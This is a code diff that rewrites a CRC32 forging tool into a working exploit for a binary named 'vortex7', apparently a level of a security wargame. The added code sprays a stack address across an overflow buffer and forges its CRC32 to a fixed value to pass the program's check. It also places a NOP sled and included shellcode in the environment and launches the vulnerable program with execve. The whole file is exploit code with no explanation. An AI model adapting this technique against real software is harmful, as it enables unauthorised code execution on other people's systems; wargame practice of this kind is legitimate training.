@@ -15,7 +15,14 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include "crc32_table.h"
+#include "../shellcode/shellcode.h"
+#include "../utils/get_esp.h"
+
+#define	VULN_BIN	"./vortex7"
+
+#define	DYNAMIC_CRC32_TABLE
 
 #define CRCPOLY		0xEDB88320
 #define CRCINV		0x5B358FD3 // inverse poly of (x^N) mod CRCPOLY
@@ -24,6 +31,13 @@
 //#define FINALXOR	0xFFFFFFFF
 #define FINALXOR	0x00000000
 #define FIXCRC		0xe1ca95ee
+
+#define BUFFER_SIZE	128
+#define	PAYLOAD_SIZE	2048
+#define DEFAULT_ALIGN	0
+#define DEFAULT_OFFSET	0
+#define NOP		0x90
+
 typedef unsigned int uint32;
 
 /**
@@ -103,39 +117,74 @@ void fix_crc_end(unsigned char *buffer, int length, uint32 tcrcreg, uint32 *crc_
 	}
 }
 
-int main(int argc, char* argv[]) {
-	if (argc < 2) {
-		printf("usage: %s <arg>\n", argv[0]);
-		return 0;
-	}
-	int length = strlen(argv[1]);
-
+/**
+ * Initializes the CRC32 table.
+ */
+uint32* init_crc_table() {
+#ifdef DYNAMIC_CRC32_TABLE
 	// generate CRC32 table
-	uint32 crc_table_dynamic[256];
+	uint32* crc_table_dynamic = malloc(256*sizeof(uint32));
 	make_crc_table(crc_table_dynamic);
+	return crc_table_dynamic;
+#else
+	return crc_table_static;
+#endif
+}
 
-	// use reference to static CRC32 table
-	uint32 *crc_table = (uint32*)crc_table_static;
-//	uint32 *crc_table = crc_table_dynamic;
+/**
+ * Generates the overflow buffer, contains repeated sequence with
+ * the target address.
+ */
+char* make_buffer (int offset, int align) {
+	char* buffer = malloc(BUFFER_SIZE);
+	uint32 addr = get_esp() - offset;
+	printf("Using address: 0x%X\n", addr);
+	uint32* addr_ptr = (uint32*)buffer;
+	int i;
+	for (i = 0; i < BUFFER_SIZE; i+=4) {
+		*(addr_ptr++) = addr;
+	}
+	buffer[BUFFER_SIZE - 1] = '\0';
+	return buffer + (align % 4);	
+}
 
-	// compute CRC32
-	int crc32;
-	crc32 = crc32_tabledriven(argv[1], length, crc_table);
-	fprintf(stderr, "Original CRC:\t0x%08X\n", crc32);
+/**
+ * Generates the payload, a NOP-sled followed by the shellcode.
+ */
+char* make_payload() {
+	char* payload = malloc(PAYLOAD_SIZE);
+	char* ptr = payload;
+	int i;
+	for (i = 0; i < PAYLOAD_SIZE - strlen(shellcode) - 1; i++) {
+		*(ptr++) = NOP;
+	}
+	for (i = 0; i < strlen(shellcode); i++) {
+		*(ptr++) = shellcode[i];
+	}
+	payload[PAYLOAD_SIZE - 1] = '\0';
+	return payload;
+}
 
-	// adjust buffer
-	char* buffer = malloc(length + 4);
-	memcpy(buffer, argv[1], length);
-	fix_crc_end(buffer, length + 4, FIXCRC, crc_table);
+int main(int argc, char* argv[]) {
+	// create and adjust overflow buffer
+	int offset = DEFAULT_OFFSET;
+	int align = DEFAULT_ALIGN;
+	if (argc > 1) offset = atoi(argv[1]);
+	if (argc > 2) align = atoi(argv[2]);
+	char* buffer = make_buffer(offset, align);
+	uint32* crc_table = init_crc_table();
+	fix_crc_end(buffer, BUFFER_SIZE, FIXCRC, crc_table);
+
+	// call vulnerable binary with adjusted overflow buffer in argv and payload in envp
+	char* argv_[3];
+	argv_[0] = VULN_BIN;
+	argv_[1] = buffer;
+	argv_[2] = NULL;
+	char* envp[2];
+	envp[0] = make_payload();
+	envp[1] = NULL;
+	execve(argv_[0], argv_, envp);
 	
-	// recompute CRC32
-	crc32 = crc32_tabledriven(buffer, length + 4, crc_table);
-	fprintf(stderr, "Adjusted CRC:\t0x%08X\n", crc32);
-
-	// output adjustment
-	uint32 adjustment = *((uint32*)(buffer + length));
-	fprintf(stderr, "Adjustment:\t0x%08X\n", adjustment);
-
-	fprintf(stdout, "%s", buffer);
 	return 0;
 }
+
